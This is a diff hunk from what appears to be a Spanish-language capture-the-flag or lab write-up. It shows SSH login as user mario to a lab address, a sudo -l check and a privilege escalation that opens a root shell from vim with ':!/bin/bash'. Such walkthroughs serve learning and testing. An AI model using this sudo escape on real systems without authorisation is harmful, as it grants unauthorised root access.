@@ -35,7 +35,9 @@ ssh mario@172.18.0.2
 sudo -l
 descubrimos que podemos ejecutar el comando vim
 sudo -u root /usr/bin/vim
+
 :!/bin/bash
+
 whoami
 
 ![Screenshot 2024-11-09 082127](https://github.com/user-attachments/assets/e676f853-c17e-4ebd-a807-ca4e61a7eda8)
